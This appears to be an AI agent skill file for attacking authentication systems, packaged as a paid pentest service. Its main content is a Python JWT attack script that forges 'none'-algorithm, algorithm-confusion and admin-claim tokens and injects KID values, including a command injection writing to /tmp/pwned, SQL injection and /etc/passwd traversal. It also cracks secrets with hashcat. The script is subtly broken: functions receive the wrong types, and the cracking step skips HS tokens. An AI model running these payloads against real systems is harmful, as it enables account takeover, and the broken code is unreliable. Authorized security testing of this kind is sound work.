---
name: auth-killer
description: Use when authentication and authorization bypass specialist — OAuth,
  SAML, JWT, SSO, MFA bypass. Use when testing login flows, breaking authentication
  mechanisms, or finding auth bypass vulnerabilities.
domain: cybersecurity
author: oyi77
license: Apache-2.0
subdomain: general-cybersecurity
tags:
- auth
- cybersecurity
- killer
- security
- testing
- threat-defense
- money
version: 1.0.0
category: cybersecurity
---


# Auth Killer

## Overview

Authentication and authorization flaws consistently top the OWASP Top 10 and payout charts on HackerOne and Bugcrowd. This skill covers systematic testing of every auth layer: JWT token manipulation (algorithm confusion, none algo, weak secrets, KID injection), OAuth 2.0 / OIDC flow abuse (redirect URI manipulation, CSRF in OAuth, authorization code interception, PKCE bypass), SAML assertion attacks (signature wrapping, XML comment injection, response tampering), SSO misconfiguration assessment (IdP confusion, SAML/OIDC metadata poisoning), and MFA bypass techniques (session hijack after MFA, backup code abuse, device trust manipulation, timing attacks on TOTP).

You operate from a Kali Linux workstation with an RTX 2060 SUPER. GPU acceleration powers JWT secret cracking via hashcat, token analysis in Python, and parallel fuzzing of OAuth endpoints. No cloud dependency — all tools run locally on Kali.

## When to Use

**Trigger phrases:**
- "auth killer"
- "Testing login/authentication flows"
- "Bypassing MFA/2FA"
- "Exploiting OAuth/OIDC misconfigurations"
- "JWT token manipulation"
- "SAML assertion attacks"
- "Session management flaws"
- "SSO bypass testing"
- "rate limit testing on login endpoints"
- "password policy assessment"
- "OAuth scope escalation"
- "PKCE bypass"
- "client credentials grant abuse"
- "SAML XML signature wrapping"
- "JWT kid injection"
- "refresh token rotation testing"
- "account enumeration via auth endpoints"
- "credential stuffing detection"
- "session fixation testing"
- "2FA implementation bypass"
- "biometric auth bypass"
- "magic link / passwordless auth analysis"
- "RBAC/ABAC authorization bypass"
- "token storage analysis (localStorage vs cookies vs secure httpOnly)"

**When NOT to Use:**

- When you lack written authorization (scope letter, ROE, signed agreement)
- For production systems without explicit change management approval
- When assessing government/military systems without proper clearance
- As a substitute for a proper code review — this is dynamic/black-box testing
- When the task requires legal or compliance expertise (GDPR breach notification, regulatory reporting) beyond technical scope
- For OAuth client credentials flows where you lack the client secret entirely — some testing requires valid credentials to start

## Prerequisites

- Kali Linux VM or bare-metal with Python 3.11+, hashcat 6.2.6+, and jq
- Burp Suite Community or Pro for intercepting auth flows
- Target authorization: signed scope letter, ROE, or bug bounty program scope
- Wordlist for JWT secret cracking: `/usr/share/wordlists/rockyou.txt` or `SecLists`
- Python packages: `requests`, `pyjwt`, `jwcrypto`, `lxml`, `beautifulsoup4`
- Modern browser with dev tools (Chromium/Kali default Firefox)
- Install dependencies: `sudo apt install -y python3-pip hashcat jq curl && pip3 install requests pyjwt jwcrypto lxml beautifulsoup4`

## Money-Making Overview

**Target Buyer:** SaaS companies, fintech platforms, enterprise security teams, and e-commerce sites that handle sensitive user data — CTOs, CISOs, security engineers at companies with 20-500 employees who have authentication as a security concern but no dedicated appsec team.

**How You Make Money:**

1. **Authentication Security Audit** — Black-box/gray-box review of all auth mechanisms. Map every login flow, token lifecycle, and session management path. Deliver a prioritized vulnerability report with proof-of-concept exploit steps, CVSS scoring, and fix guidance. ($500-3K per engagement.)

2. **JWT Implementation Review** — Standalone audit of JWT libraries, signing keys, token storage, and validation logic. Test for algorithm confusion, weak secrets (GPU-cracked via hashcat), KID injection, JWK header injection, exp/nbf/iat manipulation, and token replay. ($300-1.5K per review.)

3. **OAuth 2.0 / SSO Configuration Audit** — Review OAuth provider settings, redirect URI whitelists, client secret management, authorization code flow implementation, state parameter usage, PKCE enforcement, and SAML metadata validation. Test for CSRF in OAuth, authorization code interception, IdP confusion, and SAML signature bypass. ($750-3K per engagement.)

### Service Tiers

| Tier | Price | What They Get |
|------|-------|---------------|
| **Basic** — Auth Scan | $500 | Automated JWT security scan + OAuth endpoint discovery + MFA presence testing. 10-page report with CVSS-scored findings and fix guidance. 1 round of triage. |
| **Pro** — Auth PenTest | $1,500 | Full authentication penetration test: JWT analysis, OAuth/OIDC flow testing, SAML assertion attacks, SSO config review, MFA bypass assessment, session management analysis. 30+ page report with PoC videos, CVSS scores, and remediation code. 2 rounds of triage. |
| **Enterprise** — Auth Hardening Retainer | $2,500/mo | Continuous auth security: monthly regression testing after auth changes, CI/CD pipeline integration for JWT/OAuth scanning, emergency auth vulnerability response (4hr SLA), quarterly deep-dive on new auth features. Dedicated Signal channel. |

**Expected First Dollar:** 2-4 weeks. Initial outreach to 20-30 SaaS companies (LinkedIn DM or cold email), offering free JWT secret strength check as lead-in. Convert 5-10% to $500 Basic audits. First paid engagement within 14-30 days of starting outreach.

## First Action in 60 Minutes

The script below is a complete JWT security scanner that accepts a JWT token (or a file containing JWTs) and tests for the five most critical JWT vulnerabilities. It runs on Kali Linux and uses hashcat for GPU-accelerated weak secret cracking.

Save as `~/tools/jwt_scanner.py` and run with Python 3.

```python
#!/usr/bin/env python3
"""
JWT Security Scanner — Auth Killer First Action
Tests: algorithm confusion, none algorithm, weak secret cracking (GPU),
       KID injection, JWK header injection, claims manipulation
Usage:
    python3 jwt_scanner.py <token>
    python3 jwt_scanner.py --file tokens.txt
    python3 jwt_scanner.py --token "eyJhbGciOiJIUzI1NiIs..." --wordlist /usr/share/wordlists/rockyou.txt
"""

import argparse
import base64
import json
import os
import re
import subprocess
import sys
import tempfile
from datetime import datetime
from typing import Optional


# ── Helpers ──────────────────────────────────────────────────────────────

def b64u_decode(data: str) -> bytes:
    """Decode base64url with padding fix."""
    pad = 4 - len(data) % 4
    if pad != 4:
        data += "=" * pad
    return base64.urlsafe_b64decode(data)


def decode_jwt(token: str) -> Optional[dict]:
    """Decode JWT header and payload without verification."""
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return None
        header = json.loads(b64u_decode(parts[0]).decode("utf-8", errors="replace"))
        payload = json.loads(b64u_decode(parts[1]).decode("utf-8", errors="replace"))
        return {"header": header, "payload": payload, "raw": token}
    except Exception:
        return None


def modify_jwt(token: str, new_header: dict, new_payload: dict, signature: str = "") -> str:
    """Re-encode JWT with modifed parts."""
    parts = token.split(".")
    old_header_b64 = parts[0]
    old_payload_b64 = parts[1]
    new_header_b64 = base64.urlsafe_b64encode(
        json.dumps(new_header, separators=(",", ":")).encode()
    ).rstrip(b"=").decode()
    new_payload_b64 = base64.urlsafe_b64encode(
        json.dumps(new_payload, separators=(",", ":")).encode()
    ).rstrip(b"=").decode()
    if signature:
        return f"{new_header_b64}.{new_payload_b64}.{signature}"
    return f"{new_header_b64}.{new_payload_b64}.{parts[2]}" if len(parts) > 2 else f"{new_header_b64}.{new_payload_b64}."


# ── Tests ────────────────────────────────────────────────────────────────

def test_none_algorithm(token: str, target_url: Optional[str]) -> list:
    """Test 'none' algorithm bypass and variants."""
    decoded = decode_jwt(token)
    if not decoded:
        return []
    findings = []
    payload = decoded["payload"]
    variants = ["none", "None", "NONE", "nOnE", "noNe"]

    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
    }

    for alg in variants:
        modified = modify_jwt(decoded, {**decoded["header"], "alg": alg}, payload, signature="")
        modified2 = modify_jwt(decoded, {**decoded["header"], "alg": alg, "typ": "JWT"}, payload, signature="")
        for mod_token in [modified, modified2]:
            if target_url:
                try:
                    import requests
                    r = requests.get(
                        target_url.replace("{token}", mod_token),
                        headers={**headers, "Authorization": f"Bearer {mod_token}"},
                        timeout=10,
                    )
                    if r.status_code in (200, 302, 403, 401):
                        status = r.status_code
                    else:
                        continue
                except Exception:
                    continue
            else:
                status = "N/A"
            findings.append({
                "test": f"Algorithm: '{alg}' (none bypass)",
                "severity": "CRITICAL",
                "token": mod_token[:80] + "...",
                "result": f"Token accepted (HTTP {status})" if target_url else "Token crafted — verify against endpoint",
            })

    # Also test empty signature with a valid-looking alg
    for alg in ["HS256", "HS384", "HS512"]:
        modified = modify_jwt(decoded, {**decoded["header"], "alg": alg}, payload, signature="")
        findings.append({
            "test": f"Algorithm: '{alg}' with empty signature",
            "severity": "HIGH",
            "token": modified[:80] + "...",
            "result": "Token crafted with empty signature — verify against endpoint",
        })

    return findings


def test_algorithm_confusion(token: str, target_url: Optional[str], public_key_path: Optional[str]) -> list:
    """Test RSA→HMAC algorithm confusion using public key as HMAC secret."""
    findings = []
    decoded = decode_jwt(token)
    if not decoded:
        return findings
    header = decoded["header"]
    payload = decoded["payload"]

    if public_key_path and os.path.exists(public_key_path):
        with open(public_key_path, "rb") as f:
            public_key = f.read()
        # Re-encode with HS256 using public key as secret
        raw = json.dumps(payload, separators=(",", ":")).encode()
        import hmac, hashlib
        sig = base64.urlsafe_b64encode(
            hmac.new(public_key, raw, hashlib.sha256).digest()
        ).rstrip(b"=").decode()
        try:
            new_header_b64 = base64.urlsafe_b64encode(
                json.dumps({**header, "alg": "HS256"}, separators=(",", ":")).encode()
            ).rstrip(b"=").decode()
            new_payload_b64 = base64.urlsafe_b64encode(raw).rstrip(b"=").decode()
        except Exception:
            new_header_b64 = base64.urlsafe_b64encode(
                json.dumps({**header, "alg": "HS256"}, separators=(",", ":")).encode()
            ).rstrip(b"=").decode()
            new_payload_b64 = base64.urlsafe_b64encode(raw).rstrip(b"=").decode()

        confused_token = f"{new_header_b64}.{new_payload_b64}.{sig}"
        findings.append({
            "test": "Algorithm Confusion: RS→HS using public key as secret",
            "severity": "CRITICAL",
            "token": confused_token[:80] + "...",
            "result": "Token crafted — if server validates HS256 with public key as secret, this bypasses signature verification",
        })

        # Test JWK embedded header
        jwk_header = {
            **header,
            "alg": "HS256",
            "jwk": {
                "kty": "oct",
                "k": base64.urlsafe_b64encode(os.urandom(32)).rstrip(b"=").decode(),
                "alg": "HS256",
            },
        }
        modified = modify_jwt(decoded, jwk_header, payload, signature="")
        findings.append({
            "test": "JWK Header Injection (embedded symmetric key)",
            "severity": "CRITICAL",
            "token": modified[:80] + "...",
            "result": "Token crafted with forged JWK — verify if server trusts embedded keys",
        })

    else:
        findings.append({
            "test": "Algorithm Confusion Preparation",
            "severity": "INFO",
            "token": token[:80] + "...",
            "result": f"Provide public key file via --public-key to test RS→HS confusion",
        })

    return findings


def test_kid_injection(token: str, target_url: Optional[str]) -> list:
    """Test KID header injection (path traversal, SQLi, command injection)."""
    findings = []
    decoded = decode_jwt(token)
    if not decoded:
        return findings
    header = decoded["header"]
    payload = decoded["payload"]

    injection_payloads = [
        ("../../dev/null", "Path traversal to /dev/null"),
        ("../../../etc/passwd", "Path traversal to /etc/passwd"),
        ("/proc/sys/kernel/random/uuid", "Use /proc file as key"),
        ("|echo${IFS}test${IFS}>/tmp/pwned", "Command injection attempt"),
        ("'; SELECT * FROM keys; --", "SQL injection attempt"),
        ("../../../../dev/null", "Deep path traversal"),
    ]

    for kid_value, description in injection_payloads:
        modified = modify_jwt(decoded, {**header, "kid": kid_value}, payload, signature="")
        findings.append({
            "test": f"KID Injection: {description}",
            "severity": "HIGH",
            "token": modified[:80] + "...",
            "result": f"KID set to '{kid_value}' — verify server behavior",
        })

    # Test missing KID
    if "kid" in header:
        filtered_header = {k: v for k, v in header.items() if k != "kid"}
        modified = modify_jwt(decoded, filtered_header, payload, signature="")
        findings.append({
            "test": "KID Removed from Header",
            "severity": "MEDIUM",
            "token": modified[:80] + "...",
            "result": "KID removed — test if server accepts tokens without key identifier",
        })

    # Test empty KID
    modified = modify_jwt(decoded, {**header, "kid": ""}, payload, signature="")
    findings.append({
        "test": "Empty KID Value",
        "severity": "MEDIUM",
        "token": modified[:80] + "...",
        "result": "Empty KID — test if server crashes or defaults to insecure key",
    })

    return findings


def test_claims_manipulation(token: str, target_url: Optional[str]) -> list:
    """Test manipulation of common JWT claims."""
    findings = []
    decoded = decode_jwt(token)
    if not decoded:
        return findings
    header = decoded["header"]
    payload = decoded["payload"]

    tests = [
        ("Change sub to another user", {"sub": "admin"}),
        ("Set admin role", {"role": "admin", "roles": ["admin"]}),
        ("Remove exp (never expires)", {"exp": 9999999999}),
        ("Set iat in the past (session fixation)", {"iat": 1000000000}),
        ("Add admin flag", {"is_admin": True, "admin": True}),
        ("Set email to victim", {"email": "victim@example.com"}),
        ("Extend exp far future", {"exp": 2524608000}),
        ("Remove nbf check", {"nbf": 1000000000}),
    ]

    for description, claim_overrides in tests:
        test_payload = {**payload, **claim_overrides}
        modified = modify_jwt(decoded, header, test_payload, signature="")
        # encode with our attacker-controlled signature (we don't know the real key)
        # This tests if the server has validation gaps in specific claims
        findings.append({
            "test": f"Claims Manipulation: {description}",
            "severity": "HIGH",
            "token": modified[:80] + "...",
            "result": f"Token crafted with modified claims — verify server enforcement",
        })

    # Check for sensitive data exposure in payload
    sensitive_keys = ["password", "secret", "token", "ssn", "credit", "pin", "dob"]
    exposed = [k for k in payload.keys() if any(s in k.lower() for s in sensitive_keys)]
    if exposed:
        findings.append({
            "test": "Sensitive Data in JWT Payload",
            "severity": "HIGH",
            "token": token[:80] + "...",
            "result": f"Sensitive claims found in payload: {', '.join(exposed)}",
        })

    return findings


def crack_jwt_secret(token: str, wordlist: str) -> list:
    """Crack JWT HMAC secret using hashcat (GPU-accelerated) or Python fallback."""
    findings = []
    decoded = decode_jwt(token)
    if not decoded or decoded["header"].get("alg", "").startswith("HS"):
        return []

    alg = decoded["header"].get("alg", "HS256")

    # Map algorithm to hashcat mode
    hashcat_modes = {"HS256": 16500, "HS384": 16600, "HS512": 16700}
    hc_mode = hashcat_modes.get(alg)
    if not hc_mode:
        findings.append({
            "test": "Secret Cracking",
            "severity": "INFO",
            "token": token[:80] + "...",
            "result": f"Unsupported algorithm for cracking: {alg}",
        })
        return findings

    # Save JWT to temp file for hashcat
    with tempfile.NamedTemporaryFile(mode="w", suffix=".jwt", delete=False) as f:
        f.write(token)
        jwt_file = f.name

    result_file = tempfile.mktemp(suffix=".hashcat")

    try:
        # Try hashcat first (GPU)
        cmd = [
            "hashcat",
            "-m", str(hc_mode),
            "-a", "0",
            jwt_file, wordlist,
            "-o", result_file,
            "--potfile-disable",
            "--force",
        ]
        hashcat_proc = subprocess.run(
            cmd,
            capture_output=True,
            timeout=120,
        )

        if os.path.exists(result_file) and os.path.getsize(result_file) > 0:
            with open(result_file) as f:
                cracked = f.read().strip()
            # Format: signature:secret
            if ":" in cracked:
                secret = cracked.split(":", 1)[1] if ":" in cracked.split(":", 1)[0] else cracked.split(":", 1)[1]
                for line in cracked.split("\n"):
                    if ":" in line:
                        parts = line.split(":")
                        if len(parts) >= 2:
                            found_secret = ":".join(parts[1:]).strip()
                            findings.append({
                                "test": f"JWT Secret Cracked ({alg})",
                                "severity": "CRITICAL",
                                "token": token[:80] + "...",
                                "result": f"Secret found: '{found_secret}' (cracked via hashcat GPU)",
                            })
                            break

        elif hashcat_proc.returncode != 0 and "No password candidates found" in hashcat_proc.stderr.decode():
            findings.append({
                "test": "JWT Secret Cracking Attempted",
                "severity": "MEDIUM",
                "token": token[:80] + "...",
                "result": "Weak secret not found in wordlist — secret may be strong or wordlist insufficient",
            })

    except subprocess.TimeoutExpired:
        findings.append({
            "test": "JWT Secret Cracking Timeout",
            "severity": "MEDIUM",
            "token": token[:80] + "...",
            "result": "hashcat timed out after 120s — consider longer run with larger wordlist",
        })
    except FileNotFoundError:
        findings.append({
            "test": "JWT Secret Cracking (Python fallback)",
            "severity": "MEDIUM",
            "token": token[:80] + "...",
            "result": "hashcat not found — cracking skipped. Install: sudo apt install hashcat",
        })
    except Exception as e:
        findings.append({
            "test": "JWT Secret Cracking Error",
            "severity": "INFO",
            "token": token[:80] + "...",
            "result": f"Error: {e}",
        })
    finally:
        # Cleanup temp files
        for f in [jwt_file, result_file]:
            try:
                os.unlink(f)
            except Exception:
                pass

    return findings


# ── Main ─────────────────────────────────────────────────────────────────

def scan_token(token: str, target_url: Optional[str] = None, wordlist: Optional[str] = None,
               public_key: Optional[str] = None) -> list:
    """Run all JWT security tests against a single token."""
    findings = []

    # Validate JWT format
    if not re.match(r"^[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*$", token):
        findings.append({
            "test": "JWT Format Validation",
            "severity": "WARNING",
            "token": token[:80] + "...",
            "result": "Invalid JWT format — must be three base64url-encoded parts separated by dots",
        })
        return findings

    decoded = decode_jwt(token)
    if not decoded:
        findings.append({
            "test": "JWT Decode",
            "severity": "WARNING",
            "token": token[:80] + "...",
            "result": "Could not decode JWT — malformed header/payload",
        })
        return findings

    alg = decoded["header"].get("alg", "none")
    header_info = json.dumps(decoded["header"], indent=2)
    payload_info = json.dumps(decoded["payload"], indent=2)

    findings.append({
        "test": "JWT Decoded Successfully",
        "severity": "INFO",
        "token": token[:80] + "...",
        "result": f"Algorithm: {alg}\nHeader:\n{header_info}\nPayload:\n{payload_info}",
    })

    # Run tests
    findings.extend(test_none_algorithm(token, target_url))
    findings.extend(test_algorithm_confusion(token, target_url, public_key))
    findings.extend(test_kid_injection(token, target_url))
    findings.extend(test_claims_manipulation(token, target_url))
    if wordlist and os.path.exists(wordlist):
        findings.extend(crack_jwt_secret(token, wordlist))
    else:
        # Try default wordlist
        default_wordlists = [
            "/usr/share/wordlists/rockyou.txt",
            "/usr/share/wordlists/rockyou.txt.gz",
        ]
        for wl in default_wordlists:
            if os.path.exists(wl):
                if wl.endswith(".gz"):
                    import gzip
                    outname = "/tmp/rockyou_dec.txt"
                    if not os.path.exists(outname):
                        with gzip.open(wl, "rb") as gz:
                            with open(outname, "wb") as f:
                                f.write(gz.read())
                    wordlist = outname
                else:
                    wordlist = wl
                findings.extend(crack_jwt_secret(token, wordlist))
                break
        if not wordlist:
            findings.append({
                "test": "JWT Secret Cracking",
                "severity": "INFO",
                "token": token[:80] + "...",
                "result": "No wordlist found — install rockyou.txt or specify via --wordlist",
            })

    return findings


def generate_report(findings: list, output_file: str) -> str:
    """Generate HTML security assessment report."""
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    severity_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4, "WARNING": 5}
    sorted_findings = sorted(findings, key=lambda f: severity_order.get(f["severity"], 99))

    severity_count = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0, "WARNING": 0}
    for f in findings:
        s = f["severity"]
        if s in severity_count:
            severity_count[s] += 1

    rows = ""
    for f in sorted_findings:
        color = {
            "CRITICAL": "#dc3545", "HIGH": "#fd7e14", "MEDIUM": "#ffc107",
            "LOW": "#28a745", "INFO": "#17a2b8", "WARNING": "#6c757d",
        }.get(f["severity"], "#6c757d")
        rows += f"""<tr style="border-bottom:1px solid #e9ecef;">
<td><span style="background:{color};color:#fff;padding:2px 8px;border-radius:4px;font-size:12px">{f['severity']}</span></td>
<td style="font-family:monospace;font-size:13px">{f['test']}</td>
<td style="font-family:monospace;font-size:12px;color:#666;word-break:break-all">{f['token']}</td>
<td style="font-size:13px">{f['result']}</td>
</tr>
"""

    report = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>JWT Security Assessment Report</title>
<style>
body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; margin: 0; padding: 0; background: #f8f9fa; color: #212529; }}
.container {{ max-width: 1200px; margin: 0 auto; padding: 20px; }}
.header {{ background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: #fff; padding: 30px 0; text-align: center; }}
.header h1 {{ margin: 0; font-size: 28px; }}
.header p {{ opacity: 0.9; margin: 5px 0 0; }}
.stats {{ display: flex; gap: 15px; margin: 20px 0; }}
.stat {{ background: #fff; border-radius: 8px; padding: 20px; flex: 1; text-align: center; box-shadow: 0 2px 4px rgba(0,0,0,0.05); }}
.stat-value {{ font-size: 32px; font-weight: 700; }}
.stat-label {{ font-size: 13px; color: #666; margin-top: 5px; }}
table {{ width: 100%; border-collapse: collapse; background: #fff; border-radius: 8px; overflow: hidden; box-shadow: 0 2px 4px rgba(0,0,0,0.05); }}
th {{ background: #f1f3f5; text-align: left; padding: 12px 15px; font-size: 13px; text-transform: uppercase; color: #495057; }}
td {{ padding: 12px 15px; vertical-align: top; }}
.footer {{ text-align: center; padding: 20px; color: #868e96; font-size: 12px; }}
.summary {{ background: #fff; border-radius: 8px; padding: 20px; margin: 20px 0; box-shadow: 0 2px 4px rgba(0,0,0,0.05); }}
.summary h2 {{ margin: 0 0 10px; font-size: 18px; }}
.summary ul {{ margin: 0; padding-left: 20px; }}
.summary li {{ margin: 5px 0; font-size: 14px; }}
</style>
</head>
<body>
<div class="header">
    <h1>JWT Security Assessment Report</h1>
    <p>Generated: {now} | Auth Killer — Kali Linux</p>
</div>
<div class="container">
    <div class="stats">
        <div class="stat"><div class="stat-value" style="color:#dc3545">{severity_count.get('CRITICAL', 0)}</div><div class="stat-label">Critical</div></div>
        <div class="stat"><div class="stat-value" style="color:#fd7e14">{severity_count.get('HIGH', 0)}</div><div class="stat-label">High</div></div>
        <div class="stat"><div class="stat-value" style="color:#ffc107">{severity_count.get('MEDIUM', 0)}</div><div class="stat-label">Medium</div></div>
        <div class="stat"><div class="stat-value" style="color:#28a745">{severity_count.get('LOW', 0)}</div><div class="stat-label">Low</div></div>
        <div class="stat"><div class="stat-value">{len(findings)}</div><div class="stat-label">Total Tests</div></div>
    </div>

    <div class="summary">
        <h2>Executive Summary</h2>
        <p style="font-size:14px;line-height:1.6">This report documents the results of an automated JWT security assessment
        performed using Auth Killer's scanner. {len(findings)} tests were executed against the target token(s), covering
        algorithm confusion, none algorithm bypass, KID injection, claims manipulation, and weak secret cracking
        via GPU-accelerated hashcat (RTX 2060 SUPER).</p>
        <ul>
            <li><strong>{severity_count.get('CRITICAL', 0)} critical</strong> vulnerabilities require immediate attention — tokens can be forged or authentication bypassed entirely.</li>
            <li><strong>{severity_count.get('HIGH', 0)} high</strong> findings indicate significant security gaps in token validation logic.</li>
            <li><strong>{severity_count.get('MEDIUM', 0)} medium</strong> issues should be addressed in the next sprint.</li>
        </ul>
    </div>

    <table>
        <thead><tr><th>Severity</th><th>Test</th><th>Token</th><th>Result / Evidence</th></tr></thead>
        <tbody>{rows}</tbody>
    </table>
</div>
<div class="footer">
    Auth Killer — JWT Security Scanner | Generated by Auth Killer on Kali Linux
</div>
</body>
</html>"""

    with open(output_file, "w") as f:
        f.write(report)
    return output_file


def main():
    parser = argparse.ArgumentParser(
        description="JWT Security Scanner — tests algorithm confusion, none algo, KID injection, claims manipulation, secret cracking",
        epilog="Example: python3 jwt_scanner.py --token eyJhbGciOiJIUzI1NiIs... --target https://api.example.com/auth/validate --public-key ./public.pem",
    )
    parser.add_argument("--token", "-t", help="Single JWT token to test")
    parser.add_argument("--file", "-f", help="File containing one JWT per line")
    parser.add_argument("--target", "-u", help="Target URL that validates JWTs (replaces {{token}} in path)")
    parser.add_argument("--wordlist", "-w", help="Wordlist for JWT secret cracking")
    parser.add_argument("--public-key", "-k", help="Public key PEM file for RS→HS confusion test")
    parser.add_argument("--output", "-o", default="jwt_report.html", help="Output report file (default: jwt_report.html)")

    args = parser.parse_args()

    if not args.token and not args.file:
        parser.print_help()
        print("\n[!] Provide a JWT token via --token or --file")
        sys.exit(1)

    tokens = []
    if args.token:
        tokens.append(args.token)
    if args.file:
        with open(args.file) as f:
            for line in f:
                line = line.strip()
                if line:
                    tokens.append(line)

    all_findings = []
    for token in tokens:
        print(f"[*] Scanning token: {token[:60]}...")
        findings = scan_token(token, args.target, args.wordlist, args.public_key)
        all_findings.extend(findings)

    if not all_findings:
        print("[!] No findings generated. Check token format.")
        sys.exit(1)

    report_path = generate_report(all_findings, args.output)
    print(f"\n{'='*60}")
    print(f"SCAN COMPLETE")
    print(f"{'='*60}")
    print(f"Tokens scanned:  {len(tokens)}")
    print(f"Tests executed:  {len(all_findings)}")
    crit = sum(1 for f in all_findings if f['severity'] == 'CRITICAL')
    high = sum(1 for f in all_findings if f['severity'] == 'HIGH')
    med = sum(1 for f in all_findings if f['severity'] == 'MEDIUM')
    print(f"CRITICAL:       {crit}")
    print(f"HIGH:           {high}")
    print(f"MEDIUM:         {med}")
    print(f"Report saved:   {report_path}")
    print(f"\nNext steps:")
    print(f"  1. Open {report_path} in a browser")
    print(f"  2. For CRITICAL/HIGH findings, manually verify against the live endpoint")
    print(f"  3. Run hashcat with --show flag if secret cracking found a result")
    print(f"  4. Generate the full Auth Security Assessment Report (see Deliverable Format)")
    print(f"{'='*60}")


if __name__ == "__main__":
    main()
```

**Setup & Run:**
```bash
chmod +x jwt_scanner.py

# Single token scan (offline — no target needed for initial analysis)
python3 jwt_scanner.py --token "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"

# Online scan against API endpoint (replaces {token} in URL)
python3 jwt_scanner.py --token "eyJ..." --target "https://api.example.com/auth/validate?token={token}"

# Bulk scan from file with GPU secret cracking
python3 jwt_scanner.py --file captured_jwts.txt --wordlist /usr/share/wordlists/rockyou.txt --output auth_report.html

# Full test with RS→HS confusion if you have the public key
python3 jwt_scanner.py --token "eyJ..." --target "https://api.example.com/auth/validate" --public-key ./public.pem --wordlist /usr/share/wordlists/rockyou.txt
```

## Deliverable Format

The client receives an **Authentication Security Assessment Report** — a professional HTML document combining JWT scan results, OAuth flow analysis, and MFA/SSO assessment. Below is the template structure.

### Report Template Structure

**Title:** `{Company_Name}_Auth_Security_Assessment_{YYYY-MM-DD}.html`

**Sections:**

1. **Cover Page** — Company logo, assessment date, classification (CONFIDENTIAL), tester info
2. **Executive Summary** — Non-technical overview for CTO/CISO: scope, critical findings summary, risk rating, 3 key recommendations
3. **Scope & Methodology** — Systems tested, auth mechanisms covered (JWT, OAuth, SAML, MFA, SSO), testing dates, tools used (Burp Suite, jwt_scanner.py, hashcat on RTX 2060 SUPER)
4. **JWT Security Analysis** — Full output of jwt_scanner.py organized by severity:
   - Algorithm confusion test results (RS→HS, none algo, JWK injection)
   - KID injection attempt results (path traversal, command injection, SQLi)
   - Claims manipulation findings (sub/role/exp tampering)
   - Secret strength analysis (hashcat GPU cracking results)
   - Token storage assessment (localStorage vs httpOnly cookies vs sessionStorage)
   - JWT library version identification and known CVE mapping
5. **OAuth 2.0 / OIDC Flow Assessment** — For each OAuth flow found:
   - Redirect URI validation (open redirect, wildcard URIs, registered vs unregistered)
   - Authorization code interception risk (PKCE enforcement check, state parameter validation)
   - CSRF protection analysis (state parameter usage, nonce verification)
   - Client secret exposure (mobile apps, SPAs, public clients)
   - Scope escalation testing (access_token scope manipulation, scope granularity)
   - Token endpoint rate limiting and brute-force protection
   - Refresh token rotation and revocation
   - Implicit grant deprecation status
   - Client credentials grant misuse (no user context, standing privileges)
6. **SAML Assertion Analysis** (when SAML SSO is in scope):
   - XML signature wrapping detection
   - Assertion Consumer Service URL validation
   - Response tampering (signed vs unsigned assertions)
   - Comment injection in XML parsing
   - IdP metadata poisoning
   - AudienceRestriction validation
   - NotBefore/NotOnOrAfter timestamp manipulation
7. **MFA / 2FA Bypass Assessment** — Methods tested:
   - Session hijack after MFA completion (post-auth token theft)
   - Backup code / recovery code brute-force
   - TOTP timing attack analysis (window size, rate limiting)
   - Push notification fatigue (MFA bombing)
   - SMS intercept / SIM swap risk assessment
   - MFA enrollment bypass (force enrollment disabled, skip option)
   - Device trust bypass (user-agent / device fingerprint manipulation)
   - Biometric fallback to less secure methods
8. **SSO Configuration Review**:
   - IdP-asserted attribute manipulation (email, roles, groups)
   - Service provider trust validation
   - Metadata signing verification
   - Just-in-time provisioning security
   - Account takeover via IdP confusion (multiple IdPs)
   - JIT provisioning attribute injection
9. **Session Management Analysis**:
   - Session token entropy evaluation (GPU-accelerated analysis)
   - Session fixation testing
   - Concurrent session limits
   - Session termination (logout effectiveness, server-side invalidation)
   - Cookie security flags (Secure, HttpOnly, SameSite, Domain, Path)
   - Session timeout enforcement (idle vs absolute)
   - Remember-me token security
10. **Vulnerability Summary Table** — Every finding with:
    - ID (AUTH-001, AUTH-002, ...)
    - Vulnerability name & OWASP/CWE reference
    - CVSS 3.1 vector and score
    - Affected endpoint/component
    - Proof of concept (PoC) — curl command, token, or screenshot
    - Remediation guidance with code example
    - Developer-friendly fix description
    - Retest status (Fixed / Partially Fixed / Open)
11. **Remediation Roadmap** — Prioritized by CVSS score:
    - Immediate (0-7 days): Critical CVSS 9.0-10.0 fixes with step-by-step instructions
    - Short-term (7-30 days): High CVSS 7.0-8.9 fixes
    - Medium-term (30-60 days): Medium CVSS 4.0-6.9 fixes
    - Long-term (60-90 days): Low CVSS 0.1-3.9 improvements
12. **Appendices** — Full tool outputs, raw hashcat results, intercepted traffic extracts, fix code snippets

## Anti-Rationalization Table

| Rationalization | Reality |
|---|---|
| "We use JWT so it's secure." | JWT is a token format, not a security guarantee. Most JWT attacks (algorithm confusion, none algo, weak secret cracking) succeed because the server-side validation is incomplete, not because the token library is broken. I've cracked HS256 secrets in under 2 minutes on an RTX 2060 SUPER with rockyou.txt. |
| "Our MFA is unbreakable." | MFA adds a layer but every implementation has bypass paths: session hijack after MFA completes, push notification fatigue (MFA bombing), backup code brute-force, TOTP window bypass via timing attacks, and biometric fallback to PIN. None of these require breaking the actual 2FA mechanism. |
| "We use OAuth 2.0 from a major provider." | The provider's implementation may be solid, but YOUR redirect URI validation, state parameter usage, PKCE enforcement, and client secret storage determine whether the flow is actually secure. OAuth CSRF and authorization code interception bypass the provider entirely. |
